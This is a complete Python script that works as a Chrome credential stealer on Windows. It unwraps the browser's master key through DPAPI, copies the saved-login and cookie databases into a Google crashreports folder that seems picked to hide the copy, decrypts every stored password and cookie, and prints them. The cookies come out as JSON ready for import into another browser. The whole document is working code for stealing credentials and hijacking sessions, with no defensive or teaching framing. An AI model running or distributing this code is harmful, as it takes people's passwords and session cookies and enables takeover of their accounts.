import os
import time
import json
import base64
import sqlite3
import datetime
import json
import win32crypt
from Cryptodome.Cipher import AES
import shutil

def get_master_key(local_state_path):
    with open(os.environ['USERPROFILE'] + os.sep + local_state_path, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Error!"

def decrypt_value_all_version(encrypted_value, master_key):
    if encrypted_value[0:3] == b'v10':
        # Chrome > 80
        decrypted_value = decrypt_value(encrypted_value, master_key)
    else:
        # Chrome < 80
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
    return decrypted_value

def timeStamp2time(timestamp):
    timestamp = timestamp // 1000000 - 11644473600
    if timestamp > 0:
        if len(str(timestamp)) > 10:
            timestamp = timestamp / 1000
        else:
            pass
        timeArray = time.localtime(timestamp)
        otherStyleTime = time.strftime("%Y-%m-%d %H:%M:%S", timeArray)
        return otherStyleTime
    else:
        return "Unknown"

def read_db(sql, master_key, typeof):
    conn = sqlite3.connect(os.environ['USERPROFILE'] + "\\Appdata\\local\\google\\crashreports\\p3\\temp" + typeof)
    print(conn)
    cursor = conn.cursor()
    try:
        cursor.execute(sql)
        if typeof == "pass":
            print("*******pass**********")
            for r in cursor.fetchall():
                try:
                    line = r[0] + "  " + r[1] + "  " + decrypt_value_all_version(r[2], master_key)
                    print(line)
                except:
                    print ("error " + line)
        if typeof == "cook":
            res = []
            print("******Cookies**********")
            for r in cursor.fetchall():
                issecure = ""
                res1 = {}
                
                if len(r) == 17:
                    try:
                        if r[6] == 0:
                            issecure = "http://"
                        elif r[6] == 1:
                            issecure = "https://"
                        res1["Host raw"] = issecure + r[1]
                        res1["Name raw"] = r[2]
                        res1["Path raw"] = r[4]
                        res1["Content raw"] = decrypt_value_all_version(r[12], master_key).replace(" ", "")
                        webkit_timestamp = int(str(r[5]).replace(" ", ""))
                        if webkit_timestamp != 0:
                            res1["Expires"] = str(timeStamp2time(r[5]))
                            expireraw = ""
                            epoch_start = datetime.datetime(1601, 1, 1)
                            delta = datetime.timedelta(microseconds=int(webkit_timestamp))
                            dt = epoch_start + delta
                            struunix = str(time.mktime(dt.timetuple())).split(".")[0]
                            ref = int(str(time.time()).split(".")[0])
                            if int(struunix) > ref:
                                expireraw = str(struunix)
                            else:
                                expireraw = str(int(struunix) + 1000)
                            res1["Expires raw"] = expireraw
                        elif webkit_timestamp == 0:
                            res1["Expires"] = "At the end of the session"
                            res1["Expires raw"] = "0"
                        if r[6] == 0:
                            res1["Send for"] = "Any type of connection"
                            res1["Send for raw"] = "false"
                            res1["HTTP only raw"] = "false"
                        elif r[6] == 1:
                            res1["Send for"] = "Encrypted connections only"
                            res1["Send for raw"] = "true"
                            res1["HTTP only raw"] = "true"
                        # if r[13] == 0:
                        #     res1["SameSite raw"] = "None"
                        # elif r[13] == -1:
                        #     res1["SameSite raw"] = "Lax"
                        # elif r[13] == 2:
                        #     res1["SameSite raw"] = "Lax"
                        res1["SameSite raw"] = "no_restriction"
                        res1["This domain only"] = "Valid for host only"
                        res1["This domain only raw"] = "true"
                        res1["Store raw"] = "firefox-default"
                        res1["First Party Domain"] = ""
                        res.append(res1)
                    except Exception as e:
                        print(e)
            print(json.dumps(res, indent=2))
        return 0
    except Exception as e:
        print("error")
        raise e
        return 1
    cursor.close()
    conn.close()

def get_db_data(db_path, sql, typeof, master_key=None):
    target_db = os.environ['USERPROFILE'] + os.sep + db_path
    print(target_db)
    shutil.copy2(target_db, os.environ['USERPROFILE'] + "\\Appdata\\local\\google\\crashreports\\p3\\temp" + typeof)
    status = read_db(sql, master_key, typeof)
    if status == 0:
        print("ok")
    else:
        print("[!] Error !")
    try:
        os.remove(os.environ['USERPROFILE'] + "\\Appdata\\local\\google\\crashreports\\p3\\temp" + typeof)
    except Exception as e:
        pass

def main():
    chrome_master_key = get_master_key(r"AppData\Local\Google\Chrome\User Data\Local State")
    CHROME_PASSWORDS_DB_PATH = r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
    CHROME_COOKIES_DB_PATH = r"AppData\Local\Google\Chrome\User Data\Default\Cookies"
    LOGIN_DATA_SQL = "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;"
    COOKIES_SQL = "SELECT * FROM cookies;"
    get_db_data(CHROME_PASSWORDS_DB_PATH, LOGIN_DATA_SQL, "pass", chrome_master_key)
    get_db_data(CHROME_COOKIES_DB_PATH, COOKIES_SQL, "cook", chrome_master_key )
    

main()